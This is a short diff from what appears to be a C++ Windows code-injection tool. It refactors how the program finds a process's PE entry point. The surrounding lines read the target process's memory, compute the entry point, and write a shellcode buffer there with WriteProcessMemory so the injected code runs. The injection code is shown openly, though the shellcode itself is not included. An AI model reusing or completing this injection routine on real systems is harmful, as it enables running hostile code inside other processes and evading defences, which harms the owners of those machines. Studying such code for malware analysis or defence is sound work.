@@ -56,9 +56,9 @@ int main(void) {
   BYTE buf[0x1000] = {};
   ::ReadProcessMemory(pi.hProcess, imgbase, &buf, 0x1000, nullptr);
   // getting address of entry point
-  auto dhead = (PIMAGE_DOS_HEADER)buf;
   auto entry = (LPVOID)((PBYTE)imgbase + (
-     (PIMAGE_NT_HEADERS64)((PBYTE)buf + dhead->e_lfanew))->OptionalHeader.AddressOfEntryPoint);
+    (PIMAGE_NT_HEADERS64)((PBYTE)buf + ((PIMAGE_DOS_HEADER)buf)->e_lfanew)
+  )->OptionalHeader.AddressOfEntryPoint);
   printf("[*] Entry point: %p\n", entry);
   // write shellcode and execute it
   ::WriteProcessMemory(pi.hProcess, entry, sc, sizeof(sc), nullptr);
